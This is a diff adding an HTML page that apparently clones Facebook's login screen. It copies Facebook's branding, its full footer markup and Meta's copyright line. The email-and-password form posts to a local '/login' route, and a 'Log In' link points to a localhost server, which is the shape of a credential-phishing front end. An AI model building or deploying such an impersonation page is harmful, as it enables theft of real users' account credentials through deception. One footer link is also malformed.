@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<!-- Coding By CodingNepal - www.codingnepalweb.com -->
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Facebook Login Page | CodingNepal</title>
+
+  <link rel="shortcut icon" href="#">
+  <link rel="stylesheet" type="text/css" href="css/style.css">
+  <link rel="stylesheet" type="text/css" href="css/footer.css">
+
+</head>
+
+<body>
+  <div class="container flex">
+    <div class="facebook-page flex">
+      <div class="text">
+        <h1>facebook</h1>
+        <p>Connect with friends and the world </p>
+        <p> around you on Facebook.</p>
+      </div>
+      
+      <form action="/login" method="post">
+        <input type="email" name="email" id="email" placeholder="Email or phone number" required>
+        <input type="password" name="password" id="password" placeholder="Password" required>
+        <div class="link">
+          <button type="submit" class="login">Login</button>
+          <a href="#" class="forgot">Forgot password?</a>
+        </div>
+        <hr>
+        <div class="button">
+          <a href="#">Create new account</a>
+        </div>
+      </form>
+      <div id="reg_pages_msg">
+        <a id="createPage" href="https://www.facebook.com/signup">Create a Page</a>&nbsp;for a celebrity, brand or business.
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
+    <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
+      <li>English (US)</li>
+      <li>
+        <a class="_sv4" dir="ltr" href="https://bg-bg.facebook.com/"
+          onclick="require('IntlUtils').setCookieLocale('bg_BG', 'en_US', 'https://bg-bg.facebook.com/', 'www_list_selector', 0); return false;"
+          title="Bulgarian">Български</a>
+      </li>
+
+      <li>
+        <a class="_sv4" dir="ltr" href="https://tr-tr.facebook.com/"
+          onclick="require('IntlUtils').setCookieLocale('tr_TR', 'en_US', 'https://tr-tr.facebook.com/', 'www_list_selector', 1); return false;"
+          title="Turkish">Türkçe</a>
+      </li>
+      <li>
+        <a class="_sv4" dir="ltr" href="https://ru-ru.facebook.com/"
+          onclick="require('IntlUtils').setCookieLocale('ru_RU', 'en_US', 'https://ru-ru.facebook.com/', 'www_list_selector', 2); return false;"
+          title="Russian">Русский</a>
+      </li>
+      <li>
+        <a class="_sv4" dir="ltr" href="https://de-de.facebook.com/"
+          onclick="require('IntlUtils').setCookieLocale('de_DE', 'en_US', 'https://de-de.facebook.com/', 'www_list_selector', 3); return false;"
+          title="German">Deutsch</a>
+      </li>
+      <li>
+        <a class="_sv4" dir="rtl" href="https://ar-ar.facebook.com/"
+          onclick="require('IntlUtils').setCookieLocale('ar_AR', 'en_US', 'https://ar-ar.facebook.com/', 'www_list_selector', 4); return false;"
+          title="Arabic">العربية</a>
+      </li>
+      <li>
+        <a class="_sv4" dir="ltr" href="https://el-gr.facebook.com/"
+          onclick="require('IntlUtils').setCookieLocale('el_GR', 'en_US', 'https://el-gr.facebook.com/', 'www_list_selector', 5); return false;"
+          title="Greek">Ελληνικά</a>
+      </li>
+      <li>
+        <a class="_sv4" dir="ltr" href="https://es-es.facebook.com/"
+          onclick="require('IntlUtils').setCookieLocale('es_ES', 'en_US', 'https://es-es.facebook.com/', 'www_list_selector', 6); return false;"
+          title="Spanish (Spain)">Español (España)</a>
+      </li>
+      <li>
+        <a class="_sv4" dir="ltr" href="https://it-it.facebook.com/"
+          onclick="require('IntlUtils').setCookieLocale('it_IT', 'en_US', 'https://it-it.facebook.com/', 'www_list_selector', 7); return false;"
+          title="Italian">Italiano</a>
+      </li>
+      <li>
+        <a class="_sv4" dir="ltr" href="https://pt-br.facebook.com/"
+          onclick="require('IntlUtils').setCookieLocale('pt_BR', 'en_US', 'https://pt-br.facebook.com/', 'www_list_selector', 8); return false;"
+          title="Portuguese (Brazil)">Português (Brasil)</a>
+      </li>
+      <li>
+        <a class="_sv4" dir="ltr" href="https://fr-fr.facebook.com/"
+          onclick="require('IntlUtils').setCookieLocale('fr_FR', 'en_US', 'https://fr-fr.facebook.com/', 'www_list_selector', 9); return false;"
+          title="French (France)">Français (France)</a>
+      </li>
+
+
+    </ul>
+    <div id="contentCurve"></div>
+    <div id="pageFooterChildren" role="contentinfo" aria-label="Facebook site links">
+      <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
+        <li><a href="https://www.facebook.com/signup" title="Sign Up for Facebook" style="color: grey;">Sign Up</a></li>
+        <li><a href="http://127.0.0.1:5000" title="Log into Facebook" style="color: grey;">Log In</a></li>
+        <li><a href="https://messenger.com/" title="Check out Messenger." style="color: grey;">Messenger</a></li>
+        <li><a href="/lite/" title="Facebook Lite for Android." style="color: grey;"Facebook Lite</a></li>
+        <li><a href="https://www.facebook.com/watch/" title="Browse in Video" style="color: grey;">Video</a></li>
+        <li><a href="/places/" title="Check out popular places on Facebook." style="color: grey;">Places</a></li>
+        <li><a href="/games/" title="Check out Facebook games." style="color: grey;">Games</a></li>
+        <li><a href="/marketplace/" title="Buy and sell on Facebook Marketplace." style="color: grey;">Marketplace</a></li>
+        <li><a href="https://pay.facebook.com/" title="Learn more about Meta Pay" target="_blank" style="color: grey;">Meta Pay</a></li>
+        <li><a href="https://www.meta.com/" title="Check out Meta" target="_blank" style="color: grey;">Meta Store</a></li>
+        <li><a href="https://www.meta.com/quest/" title="Learn more about Meta Quest" target="_blank" style="color: grey;">Meta Quest</a>
+        </li>
+        <li><a
+            href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT2uSIsIJbavJlPNE6qRwU9xZhQ01FBGwKkIVYsuCgvmdjMuM43wQTXmH3SbgUDFM4Abd3LDitw9XRtAPxbgt7fkA6EjiSNgTTJBmTIFTm9urHVxN3sdEmohrVMufkHVWmH99b2bA3mP_B7TNGSJ4K0mfvDYfNfOO8iS-A"
+            title="Check out Instagram" target="_blank" rel="noreferrer nofollow"
+            data-lynx-mode="asynclazy" style="color: grey;">Instagram</a></li>
+        <li><a href="https://www.threads.net/" title="Check out Threads" style="color: grey;">Threads</a></li>
+        <li><a href="/fundraisers/" title="Donate to worthy causes." style="color: grey;">Fundraisers</a></li>
+        <li><a href="/biz/directory/" title="Browse our Facebook Services directory." style="color: grey;">Services</a></li>
+        <li><a href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
+            title="See the Voting Information Center." style="color: grey;">Voting Information Center</a></li>
+        <li><a href="/privacy/policy/?entry_point=facebook_page_footer"
+            title="Learn how we collect, use and share information to support Facebook." style="color: grey;">Privacy Policy</a></li>
+        <li><a href="/privacy/center/?entry_point=facebook_page_footer"
+            title="Learn how to manage and control your privacy on Facebook." style="color: grey;">Privacy Center</a></li>
+        <li><a href="/groups/discover/" title="Explore our Groups." style="color: grey;">Groups</a></li>
+        <li><a href="https://about.meta.com/" accesskey="8"
+            title="Read our blog, discover the resource center, and find job opportunities." style="color: grey;">About</a></li>
+        <li><a
+            href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto"
+            title="Advertise on Facebook." style="color: grey;">Create ad</a></li>
+        <li><a href="/pages/create/?ref_type=site_footer" title="Create a page" style="color: grey;">Create Page</a></li>
+        <li><a href="https://developers.facebook.com/?ref=pf" title="Develop on our platform." style="color: grey;">Developers</a></li>
+        <li><a href="/careers/?ref=pf" title="Make your next career move to our awesome company." style="color: grey;">Careers</a></li>
+        <li><a href="/policies/cookies/" title="Learn about cookies and Facebook." data-nocookies="1" style="color: grey;">Cookies</a></li>
+        <li><a class="_41ug" data-nocookies="1" href="https://www.facebook.com/help/568137493302217"
+            title="Learn about Ad Choices." style="color: grey;">Ad choices<i class="img sp_EP9wX8qDDvu sx_6bdd81"></i></a></li>
+        <li><a data-nocookies="1" href="/policies?ref=pf" accesskey="9" title="Review our terms and policies." style="color: grey;">Terms</a>
+        </li>
+        <li><a href="/help/?ref=pf" accesskey="0" title="Visit our Help Center." style="color: grey;">Help</a></li>
+        <li><a href="help/637205020878504" title="Visit our Contact Uploading &amp; Non-Users Notice." style="color: grey;">Contact Uploading
+            &amp; Non-Users</a></li>
+        <li><a accesskey="6" class="accessible_elem" href="/settings"
+            title="View and edit your Facebook settings." style="color: grey;">Settings</a></li>
+        <li><a accesskey="7" class="accessible_elem" href="/allactivity?privacy_source=activity_log_top_menu"
+            title="View your activity log" style="color: grey;">Activity log</a></li>
+      </ul>
+    </div>
+    <div class="mvl copyright">
+      <div><span> Meta © 2024</span></div>
+    </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  <span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none" /></span>
+  </div>
+  <div style="display:none">
+    <div></div>
+  </div>
+
+
+</body>
+
+</html>
